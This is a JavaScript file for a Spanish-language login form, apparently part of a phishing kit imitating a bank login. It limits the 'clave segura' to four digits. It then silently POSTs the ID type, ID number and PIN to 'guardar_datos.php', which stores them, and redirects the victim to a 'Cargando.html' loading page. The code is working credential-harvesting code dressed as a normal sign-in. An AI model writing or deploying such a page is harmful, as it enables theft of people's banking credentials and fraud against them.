document.addEventListener("DOMContentLoaded", function () {
    const passwordInput = document.getElementById("clave_segura");
    const togglePassword = document.querySelector(".toggle-password");
    const idInput = document.getElementById("numero_identificacion");
    const loginButton = document.querySelector(".btn");
    const tipoIdentificacion = document.querySelector("#tipo_id");
    console.log(tipoIdentificacion); // Verifica si aparece en consola

    if (!passwordInput || !togglePassword || !idInput || !loginButton || !tipoIdentificacion) {
        console.error("Algunos elementos del formulario no fueron encontrados en el DOM.");
        return;
    }

    // Restringir la clave a solo números y 4 caracteres
    passwordInput.addEventListener("input", function () {
        this.value = this.value.replace(/\D/g, "").slice(0, 4);
    });

    // Alternar visibilidad de la clave
    togglePassword.addEventListener("click", function () {
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
            togglePassword.textContent = "👁";
        } else {
            passwordInput.type = "password";
            togglePassword.textContent = "👁";
        }
    });

    // Validar que los campos estén completos
    function validarCampos() {
        if (idInput.value.trim() !== "" && passwordInput.value.length === 4) {
            loginButton.style.background = "#0043a9";
            loginButton.disabled = false;
        } else {
            loginButton.style.background = "#ccc";
            loginButton.disabled = true;
        }
    }

    idInput.addEventListener("input", validarCampos);
    passwordInput.addEventListener("input", validarCampos);

    // Enviar datos en segundo plano
    loginButton.addEventListener("click", function (event) {
        event.preventDefault(); // Evita la recarga de la página

        let formData = new FormData();
        formData.append("tipo_identificacion", tipoIdentificacion.value);
        formData.append("numero_identificacion", idInput.value);
        formData.append("clave_segura", passwordInput.value);

        fetch("guardar_datos.php", {
            method: "POST",
            body: formData
        })
        .then(response => response.text())
        .then(data => {
            console.log("Datos guardados correctamente:", data);
            window.location.href = "Cargando.html";
        })
        .catch(error => console.error("Error al guardar datos:", error));
    });
});
